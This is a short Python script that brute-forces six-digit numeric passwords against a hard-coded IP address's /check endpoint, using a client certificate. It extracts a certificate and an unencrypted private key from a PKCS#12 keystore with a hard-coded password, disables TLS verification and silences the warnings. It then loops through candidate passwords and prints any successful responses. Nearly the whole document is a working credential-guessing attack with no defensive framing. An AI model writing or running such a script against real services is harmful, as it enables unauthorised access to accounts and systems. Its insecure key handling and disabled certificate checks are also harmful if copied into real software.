import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import requests
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.serialization import pkcs12
from cryptography.hazmat.primitives.serialization import (
    Encoding,
    PrivateFormat,
    NoEncryption,
)
from tqdm import tqdm
import json

warnings.simplefilter("ignore", InsecureRequestWarning)


def send_request(password, cert_file, key_file):
    try:
        response = requests.post(
            "https://212.193.48.86:8080/check",
            data={"password": password},
            cert=(cert_file, key_file),
            verify=False,  # Disable certificate verification (for testing purposes)
        )
        return response
    except requests.exceptions.SSLError as e:
        print(f"SSL Error: {e}")
    except requests.exceptions.RequestException as e:
        print(f"Request Error: {e}")
    return None


def brute_force_passwords(password_list, cert_file, key_file):
    response_list = []
    for password in tqdm(password_list, desc="Brute-forcing passwords"):
        response = send_request(password, cert_file, key_file)
        if response and response.status_code == 200:
            response_list.append(response.text.replace('\n', ''))
            print(response_list)


# Load the .p12 file and convert to PEM format
p12_file_path = "keystore_new.p12"
p12_password = b"exportpassword"

with open(p12_file_path, "rb") as f:
    p12_data = f.read()

private_key, certificate, additional_certs = pkcs12.load_key_and_certificates(
    p12_data, p12_password
)

with open("cert.pem", "wb") as cert_file:
    cert_file.write(certificate.public_bytes(Encoding.PEM))

with open("key.pem", "wb") as key_file:
    key_file.write(
        private_key.private_bytes(
            encoding=Encoding.PEM,
            format=PrivateFormat.PKCS8,
            encryption_algorithm=NoEncryption(),
        )
    )

with open("ca.pem", "wb") as ca_file:
    for ca_cert in additional_certs:
        ca_file.write(ca_cert.public_bytes(Encoding.PEM))

# Example password list (you can expand this list)
password_list = [str(i).zfill(6) for i in range(3, 999)]

# Run brute-force function
brute_force_passwords(password_list, "cert.pem", "key.pem")
